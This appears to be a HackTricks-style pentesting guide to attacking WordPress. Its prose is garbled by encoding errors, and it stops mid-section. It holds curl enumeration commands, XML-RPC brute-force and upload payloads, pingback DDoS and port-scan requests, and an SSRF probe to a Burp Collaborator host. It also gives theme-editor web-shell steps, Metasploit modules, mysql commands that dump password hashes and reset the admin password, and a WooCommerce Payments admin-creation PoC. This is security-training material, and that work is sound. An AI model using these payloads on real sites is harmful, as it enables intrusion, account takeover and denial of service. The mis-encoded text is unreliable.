# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## åŸºæœ¬ä¿¡æ¯

- **Uploaded** æ–‡ä»¶ä¼šè¢«æ”¾åˆ°: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** æ‰€ä»¥å¦‚æœä½ ä¿®æ”¹ä¸»é¢˜ä¸­çš„æŸäº› php æ¥è·å– RCEï¼Œå¾ˆå¯èƒ½ä¼šç”¨åˆ°è¯¥è·¯å¾„ã€‚ä¾‹å¦‚ï¼šä½¿ç”¨ **theme twentytwelve** å¯ä»¥ **access** **404.php** æ–‡ä»¶ä½äº: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- åœ¨ **wp-config.php** ä¸­å¯ä»¥æ‰¾åˆ°æ•°æ®åº“çš„ root å¯†ç ã€‚
- é»˜è®¤éœ€è¦æ£€æŸ¥çš„ç™»å½•è·¯å¾„ï¼š_**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` åŒ…å«æœ‰ç”¨çš„ä¿¡æ¯ï¼Œä¾‹å¦‚å®‰è£…çš„ WordPress ç‰ˆæœ¬ã€‚
- `wp-activate.php` åœ¨è®¾ç½®æ–° WordPress ç½‘ç«™æ—¶ç”¨äºç”µå­é‚®ä»¶æ¿€æ´»æµç¨‹ã€‚
- ç™»å½•æ–‡ä»¶å¤¹ï¼ˆå¯èƒ½è¢«é‡å‘½åä»¥éšè—ï¼‰:
  - `/wp-admin/login.php`
  - `/wp-admin/wp-login.php`
  - `/login.php`
  - `/wp-login.php`
- `xmlrpc.php` æ˜¯ä¸€ä¸ªåŠŸèƒ½æ–‡ä»¶ï¼Œå…è®¸é€šè¿‡ HTTP ä½œä¸ºä¼ è¾“æœºåˆ¶å¹¶ä½¿ç”¨ XML ä½œä¸ºç¼–ç æœºåˆ¶æ¥ä¼ è¾“æ•°æ®ã€‚è¿™ç§ç±»å‹çš„é€šä¿¡å·²è¢« WordPress çš„ [REST API](https://developer.wordpress.org/rest-api/reference) æ‰€å–ä»£ã€‚
- `wp-content` æ–‡ä»¶å¤¹æ˜¯å­˜æ”¾ plugins å’Œ themes çš„ä¸»è¦ç›®å½•ã€‚
- `wp-content/uploads/` æ˜¯å¹³å°ä¸Šä»»ä½•ä¸Šä¼ æ–‡ä»¶å­˜æ”¾çš„ç›®å½•ã€‚
- `wp-includes/` è¯¥ç›®å½•ä¿å­˜æ ¸å¿ƒæ–‡ä»¶ï¼Œä¾‹å¦‚è¯ä¹¦ã€å­—ä½“ã€JavaScript æ–‡ä»¶å’Œ widgetsã€‚
- `wp-sitemap.xml` åœ¨ Wordpress 5.5 åŠæ›´é«˜ç‰ˆæœ¬ä¸­ï¼ŒWorpress ä¼šç”ŸæˆåŒ…å«æ‰€æœ‰å…¬å¼€å¸–å­å’Œå¯å…¬å¼€æŸ¥è¯¢çš„å¸–å­ç±»å‹åŠåˆ†ç±»æ³•çš„ sitemap XML æ–‡ä»¶ã€‚

**Post exploitation**

- `wp-config.php` æ–‡ä»¶åŒ…å« WordPress è¿æ¥æ•°æ®åº“æ‰€éœ€çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æ•°æ®åº“åã€æ•°æ®åº“ä¸»æœºã€ç”¨æˆ·åå’Œå¯†ç ã€èº«ä»½éªŒè¯å¯†é’¥å’Œ salts ä»¥åŠæ•°æ®åº“è¡¨å‰ç¼€ã€‚æ­¤é…ç½®æ–‡ä»¶è¿˜å¯ä»¥ç”¨äºå¯ç”¨ DEBUG æ¨¡å¼ï¼Œè¿™åœ¨æ•…éšœæ’é™¤æ—¶éå¸¸æœ‰ç”¨ã€‚

### ç”¨æˆ·æƒé™

- **Administrator**
- **Editor**: å‘å¸ƒå¹¶ç®¡ç†ä»–äººåŠè‡ªå·±çš„å¸–å­
- **Author**: å‘å¸ƒå¹¶ç®¡ç†è‡ªå·±çš„å¸–å­
- **Contributor**: ç¼–å†™å¹¶ç®¡ç†è‡ªå·±çš„å¸–å­ä½†ä¸èƒ½å‘å¸ƒ
- **Subscriber**: æµè§ˆå¸–å­å¹¶ç¼–è¾‘å…¶ä¸ªäººèµ„æ–™

## **Passive Enumeration**

### **Get WordPress version**

æ£€æŸ¥æ˜¯å¦èƒ½æ‰¾åˆ°æ–‡ä»¶ `/license.txt` æˆ– `/readme.html`

åœ¨é¡µé¢çš„ **source code** ä¸­æŸ¥çœ‹ï¼ˆç¤ºä¾‹æ¥è‡ª [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)ï¼‰:

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS é“¾æ¥æ–‡ä»¶

![](<../../images/image (533).png>)

- JavaScript æ–‡ä»¶

![](<../../images/image (524).png>)

### è·å–æ’ä»¶
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### è·å–ä¸»é¢˜
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### æå–ç‰ˆæœ¬ï¼ˆé€šç”¨ï¼‰
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## ä¸»åŠ¨æšä¸¾

### Plugins and Themes

ä½ å¯èƒ½æ— æ³•æ‰¾åˆ°æ‰€æœ‰çš„ Plugins å’Œ Themesã€‚ä¸ºäº†å‘ç°æ‰€æœ‰è¿™äº›ï¼Œä½ éœ€è¦å¯¹ä¸€ä¸ª Plugins å’Œ Themes åˆ—è¡¨è¿›è¡Œ**ä¸»åŠ¨ Brute Force**ï¼ˆå¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬æœ‰åŒ…å«è¿™äº›åˆ—è¡¨çš„è‡ªåŠ¨åŒ–å·¥å…·ï¼‰ã€‚

### ç”¨æˆ·

- **ID Brute:** ä½ å¯ä»¥é€šè¿‡å¯¹ WordPress ç«™ç‚¹çš„ç”¨æˆ· ID è¿›è¡Œ Brute Forcing æ¥è·å–æœ‰æ•ˆç”¨æˆ·ï¼š
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
å¦‚æœå“åº”ä¸º **200** æˆ– **30X**ï¼Œåˆ™è¡¨ç¤ºè¯¥ id ä¸º **æœ‰æ•ˆ**ã€‚å¦‚æœå“åº”ä¸º **400**ï¼Œåˆ™è¯¥ id ä¸º **æ— æ•ˆ**ã€‚

- **wp-json:** ä½ ä¹Ÿå¯ä»¥å°è¯•é€šè¿‡æŸ¥è¯¢æ¥è·å–æœ‰å…³ç”¨æˆ·çš„ä¿¡æ¯ï¼š
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
å¦ä¸€ä¸ªå¯èƒ½æ³„éœ²ä¸€äº›ç”¨æˆ·ä¿¡æ¯çš„ `/wp-json/` ç«¯ç‚¹æ˜¯ï¼š
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **åªä¼šæä¾›å¯ç”¨æ­¤åŠŸèƒ½çš„ç”¨æˆ·çš„ä¿¡æ¯**ã€‚

Also note that **/wp-json/wp/v2/pages** could leak IP åœ°å€ã€‚

- **Login username enumeration**: åœ¨ä½¿ç”¨ **`/wp-login.php`** ç™»å½•æ—¶ï¼Œ**æç¤ºä¿¡æ¯** ä¼šæ ¹æ®æ‰€è¾“å…¥çš„ **ç”¨æˆ·åæ˜¯å¦å­˜åœ¨** è€Œ **ä¸åŒ**ã€‚

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resourcesã€‚ï¼ˆä¾‹å¦‚ï¼Œä½ å¯ä»¥è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹[ using this](https://github.com/relarizky/wpxploit)ï¼‰ã€‚

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**æ£€æŸ¥**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** æˆ– **`metaWeblog.getUsersBlogs`** æ˜¯å¯ä»¥ç”¨æ¥ brute-force credentials çš„ä¸€äº›æ–¹æ³•ã€‚å¦‚æœä½ èƒ½æ‰¾åˆ°å…¶ä¸­ä»»ä½•ä¸€ä¸ªï¼Œä½ å¯ä»¥å‘é€ç±»ä¼¼çš„å†…å®¹ï¼š
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
å¦‚æœå‡­è¯æ— æ•ˆï¼Œ200 å“åº”ä¸­åº”å‡ºç°æ¶ˆæ¯ _"Incorrect username or password"_ã€‚

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

ä½¿ç”¨æ­£ç¡®çš„å‡­è¯ä½ å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ã€‚åœ¨å“åº”ä¸­ä¼šå‡ºç°è·¯å¾„ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
å¦å¤–ï¼Œæœ‰ä¸€ç§ **æ›´å¿«çš„æ–¹æ³•** å¯ä»¥ä½¿ç”¨ **`system.multicall`** æš´åŠ›ç ´è§£å‡­è¯ï¼Œå› ä¸ºä½ å¯ä»¥åœ¨åŒä¸€è¯·æ±‚ä¸­å°è¯•å¤šä¸ªå‡­è¯ï¼š

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

æ­¤æ–¹æ³•é’ˆå¯¹ç¨‹åºè€Œéäººä¸ºäº¤äº’ï¼Œä¸”å¹´ä»£è¾ƒä¹…ï¼Œå› æ­¤ä¸æ”¯æŒ 2FAã€‚ æ‰€ä»¥ï¼Œå¦‚æœä½ æœ‰æœ‰æ•ˆçš„å‡­è¯ä½†ä¸»å…¥å£å— 2FA ä¿æŠ¤ï¼Œ**ä½ å¯èƒ½èƒ½å¤Ÿæ»¥ç”¨ xmlrpc.php ä½¿ç”¨è¿™äº›å‡­è¯ç™»å½•å¹¶ç»•è¿‡ 2FA**ã€‚æ³¨æ„ï¼Œä½ æ— æ³•æ‰§è¡Œé€šè¿‡æ§åˆ¶å°èƒ½å®Œæˆçš„æ‰€æœ‰æ“ä½œï¼Œä½†æ­£å¦‚ Ippsec åœ¨ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s) ä¸­è§£é‡Šçš„é‚£æ ·ï¼Œä½ ä»å¯èƒ½è·å¾— RCEã€‚

**DDoS or port scanning**

å¦‚æœä½ èƒ½åœ¨æ–¹æ³•åˆ—è¡¨ä¸­æ‰¾åˆ° _**pingback.ping**_ï¼Œä½ å¯ä»¥è®© Wordpress å‘ä»»æ„ä¸»æœº/ç«¯å£å‘é€ä»»æ„è¯·æ±‚ã€‚\
è¿™å¯ä»¥è¢«ç”¨æ¥è®© **æˆåƒä¸Šä¸‡** çš„ Wordpress **ç«™ç‚¹** è®¿é—®åŒä¸€ **ä½ç½®**ï¼ˆä»è€Œåœ¨è¯¥ä½ç½®é€ æˆ **DDoS**ï¼‰ï¼Œæˆ–è€…ä½ å¯ä»¥ç”¨å®ƒè®© **Wordpress** å» **æ‰«æ** æŸä¸ªå†…éƒ¨ **ç½‘ç»œ**ï¼ˆä½ å¯ä»¥æŒ‡å®šä»»æ„ç«¯å£ï¼‰ã€‚
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

å¦‚æœä½ å¾—åˆ° **faultCode** çš„å€¼ **å¤§äº** **0**ï¼ˆ17ï¼‰ï¼Œåˆ™è¡¨ç¤ºè¯¥ port å·²å¼€æ”¾ã€‚

æŸ¥çœ‹ä¸Šä¸€èŠ‚ä¸­ **`system.multicall`** çš„ç”¨æ³•ï¼Œäº†è§£å¦‚ä½•æ»¥ç”¨æ­¤æ–¹æ³•æ¥é€ æˆ DDoSã€‚

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

æ­¤æ–‡ä»¶é€šå¸¸å­˜åœ¨äº Wordpress ç«™ç‚¹çš„æ ¹ç›®å½•ï¼š**`/wp-cron.php`**\
å½“è®¿é—®æ­¤æ–‡ä»¶æ—¶ï¼Œä¼šæ‰§è¡Œä¸€æ¡â€œè€—è´¹å¤§é‡èµ„æºâ€çš„ MySQL æŸ¥è¯¢ï¼Œå› æ­¤å¯èƒ½ä¼šè¢«æ”»å‡»è€…ç”¨æ¥å¼•å‘ **DoS**ã€‚\
å¦å¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ`wp-cron.php` ä¼šåœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶è¢«è°ƒç”¨ï¼ˆå³ä»»æ„å®¢æˆ·ç«¯è¯·æ±‚ä»»ä½• Wordpress é¡µé¢æ—¶éƒ½ä¼šè§¦å‘ï¼‰ï¼Œåœ¨é«˜æµé‡ç«™ç‚¹ä¸Šå¯èƒ½å¯¼è‡´é—®é¢˜ï¼ˆDoSï¼‰ã€‚

å»ºè®®ç¦ç”¨ Wp-Cronï¼Œå¹¶åœ¨ä¸»æœºå†…åˆ›å»ºä¸€ä¸ªçœŸå®çš„ cronjobï¼ŒæŒ‰å›ºå®šé—´éš”æ‰§è¡Œæ‰€éœ€æ“ä½œï¼ˆä»¥é¿å…é—®é¢˜ï¼‰ã€‚

### /wp-json/oembed/1.0/proxy - SSRF

å°è¯•è®¿é—® _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ï¼ŒWorpress ç«™ç‚¹å¯èƒ½ä¼šå‘ä½ å‘èµ·è¯·æ±‚ã€‚

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

è¯¥å·¥å…·æ£€æŸ¥æ˜¯å¦å­˜åœ¨ **methodName: pingback.ping** å’Œ è·¯å¾„ **/wp-json/oembed/1.0/proxy**ï¼Œå¦‚æœå­˜åœ¨åˆ™å°è¯•åˆ©ç”¨å®ƒä»¬ã€‚

## è‡ªåŠ¨åŒ–å·¥å…·
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## é€šè¿‡è¦†ç›–ä¸€ä¸ª bit è·å–è®¿é—®æƒé™

è¿™æ›´å¤šæ˜¯å‡ºäºå¥½å¥‡ï¼Œè€Œä¸æ˜¯ä¸€æ¬¡çœŸå®çš„æ”»å‡»ã€‚åœ¨ CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) ä¸­ï¼Œä½ å¯ä»¥ç¿»è½¬ä»»æ„ wordpress æ–‡ä»¶çš„ 1 ä¸ª bitã€‚å› æ­¤ä½ å¯ä»¥ç¿»è½¬æ–‡ä»¶ `/var/www/html/wp-includes/user.php` çš„ä½ç½® `5389`ï¼Œå°† NOT (`!`) æ“ä½œå˜ä¸º NOPã€‚
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**ä¿®æ”¹æ‰€ä½¿ç”¨ä¸»é¢˜ä¸­çš„ phpï¼ˆéœ€è¦ admin credentialsï¼‰**

Appearance â†’ Theme Editor â†’ 404 Templateï¼ˆåœ¨å³ä¾§ï¼‰

å°†å†…å®¹æ”¹ä¸º php shell:

![](<../../images/image (384).png>)

åœ¨ç½‘ä¸Šæœç´¢å¦‚ä½•è®¿é—®è¯¥å·²æ›´æ–°çš„é¡µé¢ã€‚æœ¬ä¾‹ä¸­ä½ éœ€è¦è®¿é—®ï¼š [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ä½ å¯ä»¥ä½¿ç”¨ï¼š
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP æ’ä»¶

å¯èƒ½å¯ä»¥å°† .php æ–‡ä»¶ä½œä¸ºæ’ä»¶ä¸Šä¼ ã€‚\
ä½¿ç”¨ä¾‹å¦‚ä»¥ä¸‹æ–¹æ³•åˆ›å»ºä½ çš„ php åé—¨ï¼š

![](<../../images/image (183).png>)

ç„¶åæ·»åŠ ä¸€ä¸ªæ–°æ’ä»¶ï¼š

![](<../../images/image (722).png>)

ä¸Šä¼ æ’ä»¶å¹¶ç‚¹å‡» Install Nowï¼š

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

å¯èƒ½çœ‹èµ·æ¥ä»€ä¹ˆéƒ½æ²¡å‘ç”Ÿï¼Œä½†å¦‚æœä½ è¿›å…¥ Mediaï¼Œä½ ä¼šçœ‹åˆ°ä½ çš„ shell å·²ä¸Šä¼ ï¼š

![](<../../images/image (462).png>)

è®¿é—®å®ƒï¼Œä½ ä¼šçœ‹åˆ°ç”¨ä»¥æ‰§è¡Œ reverse shell çš„ URLï¼š

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

æ­¤æ–¹æ³•æ¶‰åŠå®‰è£…å·²çŸ¥å­˜åœ¨æ¼æ´ä¸”å¯è¢«åˆ©ç”¨ä»¥è·å– web shell çš„æ¶æ„æ’ä»¶ã€‚é€šè¿‡ WordPress ä»ªè¡¨ç›˜æŒ‰å¦‚ä¸‹æ­¥éª¤è¿›è¡Œï¼š

1. **Plugin Acquisition**: ä» Exploit DB ç­‰æ¥æºè·å–æ’ä»¶ï¼Œä¾‹å¦‚ [**here**](https://www.exploit-db.com/exploits/36374)ã€‚
2. **Plugin Installation**:
- å¯¼èˆªåˆ° WordPress ä»ªè¡¨ç›˜ï¼Œç„¶åå‰å¾€ `Dashboard > Plugins > Upload Plugin`ã€‚
- ä¸Šä¼ å·²ä¸‹è½½æ’ä»¶çš„ zip æ–‡ä»¶ã€‚
3. **Plugin Activation**: æ’ä»¶æˆåŠŸå®‰è£…åï¼Œå¿…é¡»é€šè¿‡ä»ªè¡¨ç›˜å°†å…¶æ¿€æ´»ã€‚
4. **Exploitation**:
- å°†æ’ä»¶ "reflex-gallery" å®‰è£…å¹¶æ¿€æ´»åï¼Œå¯å¯¹å…¶è¿›è¡Œåˆ©ç”¨ï¼Œå› ä¸ºå®ƒå·²çŸ¥å­˜åœ¨æ¼æ´ã€‚
- Metasploit framework æä¾›äº†é’ˆå¯¹è¯¥æ¼æ´çš„ exploitã€‚åŠ è½½ç›¸åº”æ¨¡å—å¹¶æ‰§è¡Œç‰¹å®šå‘½ä»¤åï¼Œå¯ä»¥å»ºç«‹ meterpreter ä¼šè¯ï¼Œä»è€Œè·å¾—å¯¹ç«™ç‚¹çš„æœªæˆæƒè®¿é—®ã€‚
- éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™åªæ˜¯åˆ©ç”¨ WordPress ç«™ç‚¹çš„ä¼—å¤šæ–¹æ³•ä¹‹ä¸€ã€‚

å†…å®¹åŒ…æ‹¬å±•ç¤ºåœ¨ WordPress ä»ªè¡¨ç›˜ä¸­å®‰è£…å¹¶æ¿€æ´»æ’ä»¶æ­¥éª¤çš„å›¾ç¤ºã€‚ä½†é‡è¦çš„æ˜¯è¦æ³¨æ„ï¼Œæœªç»æˆæƒä»¥è¿™ç§æ–¹å¼åˆ©ç”¨æ¼æ´æ˜¯éæ³•ä¸”ä¸é“å¾·çš„ã€‚æ­¤ä¿¡æ¯åº”è´Ÿè´£ä»»åœ°ä½¿ç”¨ï¼Œä»…åœ¨åˆæ³•æƒ…å¢ƒä¸‹ï¼Œä¾‹å¦‚è·å¾—æ˜ç¡®è®¸å¯çš„ penetration testing ä¸­ä½¿ç”¨ã€‚

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## ä» XSS åˆ° RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ æ˜¯ä¸€ä¸ªè„šæœ¬ï¼Œæ—¨åœ¨å°† **Cross-Site Scripting (XSS)** æ¼æ´å‡çº§ä¸º **Remote Code Execution (RCE)** æˆ– WordPress ä¸­çš„å…¶ä»–ä¸¥é‡æ¼æ´ã€‚æ›´å¤šä¿¡æ¯è¯·æŸ¥çœ‹ [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)ã€‚å®ƒæä¾›å¯¹ WordPress 6.X.Xã€5.X.X å’Œ 4.X.X ç‰ˆæœ¬çš„æ”¯æŒï¼Œå¹¶å…è®¸ï¼š
- _**Privilege Escalation:**_ åœ¨ WordPress ä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·ã€‚
- _**(RCE) Custom Plugin (backdoor) Upload:**_ å°†è‡ªå®šä¹‰æ’ä»¶ï¼ˆåé—¨ï¼‰ä¸Šä¼ åˆ° WordPressã€‚
- _**(RCE) Built-In Plugin Edit:**_ ç¼–è¾‘ WordPress çš„å†…ç½®æ’ä»¶ã€‚
- _**(RCE) Built-In Theme Edit:**_ ç¼–è¾‘ WordPress çš„å†…ç½®ä¸»é¢˜ã€‚
- _**(Custom) Custom Exploits:**_ é’ˆå¯¹ç¬¬ä¸‰æ–¹ WordPress æ’ä»¶/ä¸»é¢˜çš„è‡ªå®šä¹‰åˆ©ç”¨ã€‚

## åæ¸—é€

æå–ç”¨æˆ·åå’Œå¯†ç ï¼š
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
æ›´æ”¹ admin å¯†ç ï¼š
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress æ’ä»¶ Pentest

### æ”»å‡»é¢

äº†è§£ Wordpress æ’ä»¶å¦‚ä½•æš´éœ²åŠŸèƒ½å¯¹äºå‘ç°å…¶åŠŸèƒ½ä¸Šçš„æ¼æ´è‡³å…³é‡è¦ã€‚ä½ å¯ä»¥åœ¨ä¸‹é¢çš„è¦ç‚¹ä¸­çœ‹åˆ°æ’ä»¶å¯èƒ½æš´éœ²åŠŸèƒ½çš„æ–¹å¼ï¼Œä»¥åŠ [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/) ä¸­çš„ä¸€äº›æœ‰æ¼æ´çš„æ’ä»¶ç¤ºä¾‹ã€‚

- **`wp_ajax`**

æ’ä»¶å°†å‡½æ•°æš´éœ²ç»™ç”¨æˆ·çš„æ–¹å¼ä¹‹ä¸€æ˜¯é€šè¿‡ AJAX handlersã€‚è¿™äº›å¤„ç†ç¨‹åºå¯èƒ½åŒ…å«é€»è¾‘ã€authorization æˆ– authentication æ¼æ´ã€‚æ­¤å¤–ï¼Œè¿™äº›å‡½æ•°é€šå¸¸ä¼šå°† authentication å’Œ authorization éƒ½åŸºäº Wordpress nonce çš„å­˜åœ¨ï¼Œè€Œ **ä»»ä½•åœ¨ Wordpress å®ä¾‹ä¸­å·²è®¤è¯çš„ç”¨æˆ·éƒ½å¯èƒ½æ‹¥æœ‰**ï¼ˆä¸å…¶è§’è‰²æ— å…³ï¼‰ã€‚

è¿™äº›æ˜¯å¯ä»¥ç”¨æ¥åœ¨æ’ä»¶ä¸­æš´éœ²å‡½æ•°çš„å‡½æ•°ï¼š
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**ä½¿ç”¨ `nopriv` ä¼šä½¿è¯¥ç«¯ç‚¹å¯¹ä»»ä½•ç”¨æˆ·å¯è®¿é—®ï¼ˆå³ä½¿æ˜¯æœªè®¤è¯çš„ç”¨æˆ·ï¼‰ã€‚**

> [!CAUTION]
> æ­¤å¤–ï¼Œå¦‚æœå‡½æ•°åªæ˜¯ä½¿ç”¨ `wp_verify_nonce` æ¥æ£€æŸ¥ç”¨æˆ·çš„æˆæƒï¼Œè¯¥å‡½æ•°ä»…æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼Œé€šå¸¸ä¸ä¼šæ£€æŸ¥ç”¨æˆ·çš„è§’è‰²ã€‚å› æ­¤ä½æƒé™ç”¨æˆ·å¯èƒ½èƒ½å¤Ÿè®¿é—®é«˜æƒé™çš„æ“ä½œã€‚

- **REST API**

ä¹Ÿå¯ä»¥é€šè¿‡åœ¨ wordpress ä¸­ä½¿ç”¨ `register_rest_route` å‡½æ•°æ³¨å†Œ REST API æ¥æš´éœ²å‡½æ•°ï¼š
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œç”¨äºæ£€æŸ¥ç»™å®šç”¨æˆ·æ˜¯å¦è¢«æˆæƒè°ƒç”¨è¯¥ API æ–¹æ³•ã€‚

**å¦‚æœä½¿ç”¨å†…ç½®çš„ `__return_true` å‡½æ•°ï¼Œå®ƒå°†ç›´æ¥è·³è¿‡ç”¨æˆ·æƒé™æ£€æŸ¥ã€‚**

- **ç›´æ¥è®¿é—® php æ–‡ä»¶**

å½“ç„¶ï¼ŒWordpress ä½¿ç”¨ PHPï¼Œæ’ä»¶å†…çš„æ–‡ä»¶å¯ä»¥è¢« Web ç›´æ¥è®¿é—®ã€‚å› æ­¤ï¼Œå¦‚æœæŸä¸ªæ’ä»¶æš´éœ²äº†åªéœ€è®¿é—®è¯¥æ–‡ä»¶å³å¯è§¦å‘çš„æ˜“å—æ”»å‡»åŠŸèƒ½ï¼Œä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥åˆ©ç”¨å®ƒã€‚

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

ä¸€äº›æ’ä»¶ä¸ºå†…éƒ¨é›†æˆæˆ– reverse proxies å®ç°äº†â€œtrusted headerâ€ é€Ÿè®°ï¼Œç„¶åä½¿ç”¨è¯¥ header ä¸º REST requests è®¾ç½®å½“å‰ç”¨æˆ·ä¸Šä¸‹æ–‡ã€‚å¦‚æœè¯¥ header æœªè¢«ä¸Šæ¸¸ç»„ä»¶ä»¥åŠ å¯†æ–¹å¼ç»‘å®šåˆ°è¯·æ±‚ï¼Œæ”»å‡»è€…å¯ä»¥ä¼ªé€ å®ƒå¹¶ä»¥ administrator èº«ä»½è®¿é—®æœ‰æƒé™çš„ REST routesã€‚

- å½±å“ï¼šunauthenticated privilege escalation to admin by creating a new administrator via the core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (å¼ºåˆ¶ç”¨æˆ· ID ä¸º 1ï¼Œé€šå¸¸æ˜¯ç¬¬ä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ã€‚)
- è¢«åˆ©ç”¨çš„è·¯ç”±ï¼š`POST /wp-json/wp/v2/users`ï¼Œä½¿ç”¨æå‡çš„è§’è‰²æ•°ç»„ã€‚

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Why it works

